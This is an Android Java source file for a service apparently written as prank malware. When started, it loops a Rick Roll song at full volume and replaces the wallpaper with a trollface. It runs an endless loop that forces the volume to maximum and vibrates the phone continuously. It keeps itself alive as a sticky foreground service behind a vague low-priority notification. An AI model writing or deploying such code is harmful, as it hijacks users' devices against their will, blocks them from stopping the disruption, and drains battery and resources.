package com.example.ruinme;

import android.app.IntentService;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.app.WallpaperManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.graphics.Color;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.os.VibrationEffect;
import android.os.Vibrator;
import android.support.annotation.RequiresApi;
import android.support.v4.app.NotificationCompat;
import android.support.v4.content.LocalBroadcastManager;
import android.util.Log;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.WindowManager;

import java.io.IOException;

public class ExploitService extends Service {

    MediaPlayer rick_roll;
    AudioManager audioManager;
    WindowManager windowManager;
    public static final String ACTION_PING = ExploitService.class.getName() + ".PING";
    public static final String ACTION_PONG = ExploitService.class.getName() + ".PONG";

//    public ExploitService() {
//        super("ExploitService");
//    }

    @Override
    public int onStartCommand(Intent intent, int flags, int start_id) {




        mnmnmnmnmnmnmnmnmnmn();
        rick_roll.start();
        int max = audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC);

        WallpaperManager myWallpaperManager = WallpaperManager.getInstance(getApplicationContext());
        try {
            myWallpaperManager.setResource(R.raw.trollface);
        } catch (IOException e) {
            e.printStackTrace();
        }

        while(true) {
            audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, max, 0);
            if (false) break;
        }

        return START_STICKY;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        if (Build.VERSION.SDK_INT > Build.VERSION_CODES.O)
            startMyOwnForeground();
        else
            startForeground(1, new Notification());

        Log.d("ExploitService", "created");
        rick_roll = MediaPlayer.create(this, R.raw.never_gonna_give_you_up);
        rick_roll.setLooping(true); // Set looping
        rick_roll.setVolume(100,100);

        audioManager = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
        LocalBroadcastManager.getInstance(this).registerReceiver(mReceiver, new IntentFilter(ACTION_PING));


    }

    @Override
    public void onDestroy() {
        LocalBroadcastManager.getInstance(this).unregisterReceiver(mReceiver);
        super.onDestroy();
        Log.d("ExploitService", "destroyed");

        Intent broadcastIntent = new Intent();
        broadcastIntent.setAction("restartservice");
        broadcastIntent.setClass(this, Restarter.class);
//        this.sendBroadcast(broadcastIntent);
    }

    @Override
    public IBinder onBind(Intent intent) {
        // We don't provide binding, so return null
        return null;
    }


    public void mnmnmnmnmnmnmnmnmnmn() {
        Vibrator v = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
        //               start at 0        .         -         .         .         .         -         .         -         .         .
        long[] times = new long[]{0, 400, 100, 800, 100, 400, 100, 400, 100, 400, 100, 800, 100, 400, 500, 800, 100, 400, 100, 400, 500};
        int[] amplitudes = new int[]{0, 255, 0, 255, 0, 255, 0, 255, 0, 255, 0, 255, 0, 255, 0, 255, 0, 255, 0, 255, 0};

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            v.vibrate(VibrationEffect.createWaveform(times, amplitudes,  0));
        }
    }

    private BroadcastReceiver mReceiver = new BroadcastReceiver()
    {
        @Override
        public void onReceive (Context context, Intent intent)
        {
            if (intent.getAction() != null && intent.getAction().equals(ACTION_PING))
            {
                LocalBroadcastManager manager = LocalBroadcastManager.getInstance(getApplicationContext());
                manager.sendBroadcast(new Intent(ACTION_PONG));
            }
        }
    };

    @RequiresApi(Build.VERSION_CODES.O)
    private void startMyOwnForeground()
    {
        String NOTIFICATION_CHANNEL_ID = "example.permanence";
        String channelName = "Background Service";
        NotificationChannel chan = new NotificationChannel(NOTIFICATION_CHANNEL_ID, channelName, NotificationManager.IMPORTANCE_NONE);
        chan.setLightColor(Color.BLUE);
        chan.setLockscreenVisibility(Notification.VISIBILITY_PRIVATE);

        NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        assert manager != null;
        manager.createNotificationChannel(chan);

        NotificationCompat.Builder notificationBuilder = new NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID);
        Notification notification = notificationBuilder.setOngoing(true)
                .setContentTitle("App is running in background")
                .setPriority(NotificationManager.IMPORTANCE_MIN)
                .setCategory(Notification.CATEGORY_SERVICE)
                .build();
        startForeground(2, notification);
    }
}
